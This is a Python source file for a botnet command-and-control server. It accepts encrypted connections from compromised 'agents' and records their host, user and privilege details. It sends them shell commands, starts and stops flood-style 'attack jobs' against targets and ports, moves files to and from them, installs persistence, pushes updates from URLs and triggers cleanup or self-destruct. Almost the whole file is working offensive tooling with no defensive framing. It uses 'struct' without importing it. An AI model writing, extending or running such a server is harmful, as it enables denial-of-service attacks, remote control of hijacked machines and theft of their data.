#!/usr/bin/env python3
"""
C2 Server
Command and control server for managing agents
"""

import socket
import ssl
import threading
import time
import json
from typing import Dict, List, Optional, Callable
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path

from .encryption import C2Encryption, KeyPair
from .protocol import (
    C2Message, MessageType, ProtocolEncoder, FragmentReassembler,
    CommandBuilder
)
from .client import AgentInfo


@dataclass
class ConnectedAgent:
    """Connected agent representation"""
    info: AgentInfo
    socket: socket.socket
    encryption: C2Encryption
    reassembler: FragmentReassembler
    connected_at: float = field(default_factory=time.time)
    last_seen: float = field(default_factory=time.time)
    tags: List[str] = field(default_factory=list)
    metadata: Dict = field(default_factory=dict)
    
    @property
    def idle_time(self) -> float:
        return time.time() - self.last_seen
    
    @property
    def session_duration(self) -> float:
        return time.time() - self.connected_at
    
    def to_dict(self) -> Dict:
        return {
            **self.info.to_dict(),
            'connected_at': datetime.fromtimestamp(self.connected_at).isoformat(),
            'last_seen': datetime.fromtimestamp(self.last_seen).isoformat(),
            'idle_seconds': round(self.idle_time, 1),
            'session_seconds': round(self.session_duration, 1),
            'tags': self.tags,
            'metadata': self.metadata,
        }


@dataclass
class AttackJob:
    """Tracked attack job"""
    job_id: str
    agent_id: str
    vector: str
    target: str
    port: int
    duration: int
    started_at: float = field(default_factory=time.time)
    status: str = 'running'
    stats: Dict = field(default_factory=dict)


class C2Server:
    """C2 server for agent management"""
    
    def __init__(self, bind_addr: str = '0.0.0.0', bind_port: int = 8443,
                 ssl_cert: str = None, ssl_key: str = None,
                 password: str = None):
        self.bind_addr = bind_addr
        self.bind_port = bind_port
        self.ssl_cert = ssl_cert
        self.ssl_key = ssl_key
        self.password = password
        
        self._agents: Dict[str, ConnectedAgent] = {}
        self._jobs: Dict[str, AttackJob] = {}
        self._lock = threading.Lock()
        self._running = False
        self._server_socket: Optional[socket.socket] = None
        self._server_keypair: Optional[KeyPair] = None
        
        self._on_agent_connect: List[Callable] = []
        self._on_agent_disconnect: List[Callable] = []
        self._on_message: List[Callable] = []
        self._on_attack_update: List[Callable] = []
    
    def on_agent_connect(self, callback: Callable) -> None:
        self._on_agent_connect.append(callback)
    
    def on_agent_disconnect(self, callback: Callable) -> None:
        self._on_agent_disconnect.append(callback)
    
    def on_message(self, callback: Callable) -> None:
        self._on_message.append(callback)
    
    def on_attack_update(self, callback: Callable) -> None:
        self._on_attack_update.append(callback)
    
    def _do_handshake(self, sock: socket.socket) -> C2Encryption:
        """Perform key exchange with client"""
        encryption = C2Encryption(self._server_keypair)
        
        # Send server public key
        server_pub = encryption.keypair.get_public_pem()
        sock.sendall(struct.pack('!I', len(server_pub)) + server_pub)
        
        # Receive client public key
        data = self._recv_exact(sock, 4)
        if not data:
            raise ConnectionError("Handshake failed")
        client_pub_len = struct.unpack('!I', data)[0]
        client_pub = self._recv_exact(sock, client_pub_len)
        if not client_pub:
            raise ConnectionError("Handshake failed")
        
        # Build and send key exchange response
        response = encryption.server_handshake(client_pub)
        sock.sendall(struct.pack('!I', len(response)) + response)
        
        return encryption
    
    def _send(self, sock: socket.socket, encryption: C2Encryption, message: C2Message) -> bool:
        """Send encrypted message to agent"""
        try:
            frame = ProtocolEncoder.encode(message)
            encrypted = encryption.encrypt_message(frame)
            sock.sendall(struct.pack('!I', len(encrypted)) + encrypted)
            return True
        except Exception:
            return False
    
    def _recv(self, sock: socket.socket, encryption: C2Encryption,
              reassembler: FragmentReassembler) -> Optional[C2Message]:
        """Receive and decrypt message"""
        try:
            length_data = self._recv_exact(sock, 4)
            if not length_data:
                return None
            length = struct.unpack('!I', length_data)[0]
            
            if length > 16 * 1024 * 1024:
                return None
            
            encrypted = self._recv_exact(sock, length)
            if not encrypted:
                return None
            
            frame = encryption.decrypt_message(encrypted)
            message = ProtocolEncoder.decode(frame)
            if not message:
                return None
            
            return reassembler.add(message)
        except Exception:
            return None
    
    def _recv_exact(self, sock: socket.socket, n: int) -> Optional[bytes]:
        """Receive exactly n bytes"""
        data = b''
        while len(data) < n:
            try:
                chunk = sock.recv(n - len(data))
                if not chunk:
                    return None
                data += chunk
            except Exception:
                return None
        return data
    
    def _handle_agent(self, sock: socket.socket, addr: tuple) -> None:
        """Handle connected agent"""
        agent: Optional[ConnectedAgent] = None
        
        try:
            # Handshake
            encryption = self._do_handshake(sock)
            reassembler = FragmentReassembler()
            
            # Wait for system info
            message = self._recv(sock, encryption, reassembler)
            if not message or message.msg_type != MessageType.SYSTEM_INFO:
                sock.close()
                return
            
            agent_info = AgentInfo()
            agent_info.agent_id = message.metadata.get('agent_id', '')
            agent_info.hostname = message.metadata.get('hostname', '')
            agent_info.os_name = message.metadata.get('os', '')
            agent_info.os_version = message.metadata.get('os_version', '')
            agent_info.arch = message.metadata.get('arch', '')
            agent_info.username = message.metadata.get('user', '')
            agent_info.pid = message.metadata.get('pid', 0)
            agent_info.ip_address = message.metadata.get('ip', '')
            agent_info.python_version = message.metadata.get('python', '')
            agent_info.privileges = message.metadata.get('privileges', '')
            
            agent = ConnectedAgent(
                info=agent_info,
                socket=sock,
                encryption=encryption,
                reassembler=reassembler,
            )
            
            with self._lock:
                self._agents[agent_info.agent_id] = agent
            
            print(f"[+] Agent connected: {agent_info.agent_id} ({agent_info.hostname} @ {agent_info.ip_address})")
            
            for cb in self._on_agent_connect:
                try:
                    cb(agent)
                except Exception:
                    pass
            
            # Main loop
            while self._running:
                message = self._recv(sock, encryption, reassembler)
                if not message:
                    break
                
                agent.last_seen = time.time()
                reassembler.cleanup()
                
                for cb in self._on_message:
                    try:
                        cb(agent, message)
                    except Exception:
                        pass
                
                # Handle specific messages
                if message.msg_type == MessageType.ATTACK_STATUS:
                    job_id = message.metadata.get('job_id', '')
                    status = message.metadata.get('status', '')
                    with self._lock:
                        if job_id in self._jobs:
                            self._jobs[job_id].status = status
                    for cb in self._on_attack_update:
                        try:
                            cb(self._jobs.get(job_id))
                        except Exception:
                            pass
                
                elif message.msg_type == MessageType.ATTACK_STATS:
                    job_id = message.metadata.get('job_id', '')
                    with self._lock:
                        if job_id in self._jobs:
                            self._jobs[job_id].stats = message.metadata
                
                elif message.msg_type == MessageType.PING:
                    self._send(sock, encryption, C2Message(msg_type=MessageType.PONG))
                
                elif message.msg_type == MessageType.DISCONNECT:
                    break
        
        except Exception as e:
            if agent and self._running:
                print(f"[-] Agent {agent.info.agent_id} error: {e}")
        
        finally:
            if agent:
                with self._lock:
                    self._agents.pop(agent.info.agent_id, None)
                print(f"[-] Agent disconnected: {agent.info.agent_id}")
                for cb in self._on_agent_disconnect:
                    try:
                        cb(agent)
                    except Exception:
                        pass
            
            try:
                sock.close()
            except Exception:
                pass
    
    def start(self) -> None:
        """Start C2 server"""
        self._running = True
        self._server_keypair = KeyPair()
        
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.bind_addr, self.bind_port))
        server.listen(100)
        self._server_socket = server
        
        print(f"[*] C2 Server listening on {self.bind_addr}:{self.bind_port}")
        print(f"[*] Server public key fingerprint ready")
        
        try:
            while self._running:
                client_sock, client_addr = server.accept()
                t = threading.Thread(
                    target=self._handle_agent,
                    args=(client_sock, client_addr),
                    daemon=True
                )
                t.start()
        except KeyboardInterrupt:
            pass
        finally:
            self.stop()
    
    def stop(self) -> None:
        """Stop server"""
        self._running = False
        if self._server_socket:
            self._server_socket.close()
    
    def get_agents(self) -> List[Dict]:
        """Get all connected agents"""
        with self._lock:
            return [a.to_dict() for a in self._agents.values()]
    
    def get_agent(self, agent_id: str) -> Optional[ConnectedAgent]:
        """Get specific agent"""
        with self._lock:
            return self._agents.get(agent_id)
    
    def send_to_agent(self, agent_id: str, message: C2Message) -> bool:
        """Send message to specific agent"""
        with self._lock:
            agent = self._agents.get(agent_id)
            if not agent:
                return False
            return self._send(agent.socket, agent.encryption, message)
    
    def broadcast(self, message: C2Message) -> int:
        """Send message to all agents"""
        count = 0
        with self._lock:
            for agent in self._agents.values():
                if self._send(agent.socket, agent.encryption, message):
                    count += 1
        return count
    
    def shell_exec(self, agent_id: str, cmd: str, timeout: int = 30) -> bool:
        """Execute shell command on agent"""
        msg = CommandBuilder.shell_command(cmd, timeout)
        return self.send_to_agent(agent_id, msg)
    
    def start_attack(self, agent_id: str, vector: str, target: str,
                      port: int, duration: int, threads: int = 100,
                      **kwargs) -> Optional[str]:
        """Start attack on agent"""
        job_id = __import__('uuid').uuid4().hex[:8]
        
        msg = CommandBuilder.attack_start(
            vector=vector,
            target=target,
            port=port,
            duration=duration,
            threads=threads,
            job_id=job_id,
            **kwargs
        )
        
        if self.send_to_agent(agent_id, msg):
            job = AttackJob(
                job_id=job_id,
                agent_id=agent_id,
                vector=vector,
                target=target,
                port=port,
                duration=duration,
            )
            with self._lock:
                self._jobs[job_id] = job
            return job_id
        return None
    
    def stop_attack(self, agent_id: str, job_id: str = '') -> bool:
        """Stop attack on agent"""
        msg = CommandBuilder.attack_stop(job_id)
        return self.send_to_agent(agent_id, msg)
    
    def get_jobs(self) -> List[Dict]:
        """Get all attack jobs"""
        with self._lock:
            return [
                {
                    'job_id': j.job_id,
                    'agent_id': j.agent_id,
                    'vector': j.vector,
                    'target': j.target,
                    'port': j.port,
                    'duration': j.duration,
                    'status': j.status,
                    'started_at': datetime.fromtimestamp(j.started_at).isoformat(),
                    'stats': j.stats,
                }
                for j in self._jobs.values()
            ]
    
    def download_from_agent(self, agent_id: str, path: str) -> bool:
        """Request file download from agent"""
        msg = CommandBuilder.download_file(path)
        return self.send_to_agent(agent_id, msg)
    
    def upload_to_agent(self, agent_id: str, path: str, data: bytes) -> bool:
        """Upload file to agent"""
        msg = CommandBuilder.upload_file(path, data)
        return self.send_to_agent(agent_id, msg)
    
    def get_system_info(self, agent_id: str) -> bool:
        """Request system info from agent"""
        msg = CommandBuilder.system_info()
        return self.send_to_agent(agent_id, msg)
    
    def cleanup_agent(self, agent_id: str) -> bool:
        """Send cleanup command to agent"""
        msg = CommandBuilder.cleanup()
        return self.send_to_agent(agent_id, msg)
    
    def persist_agent(self, agent_id: str, method: str = 'systemd') -> bool:
        """Send persistence command to agent"""
        msg = CommandBuilder.persist(method)
        return self.send_to_agent(agent_id, msg)
    
    def update_agent(self, agent_id: str, url: str) -> bool:
        """Send update command to agent"""
        msg = CommandBuilder.update(url)
        return self.send_to_agent(agent_id, msg)
    
    def disconnect_agent(self, agent_id: str) -> bool:
        """Disconnect agent"""
        msg = CommandBuilder.disconnect()
        return self.send_to_agent(agent_id, msg)
    
    def self_destruct_agent(self, agent_id: str, delay: int = 0) -> bool:
        """Send self-destruct command"""
        msg = CommandBuilder.self_destruct(delay)
        return self.send_to_agent(agent_id, msg)
    
    def ping_agent(self, agent_id: str) -> bool:
        """Ping agent"""
        msg = CommandBuilder.ping()
        return self.send_to_agent(agent_id, msg)
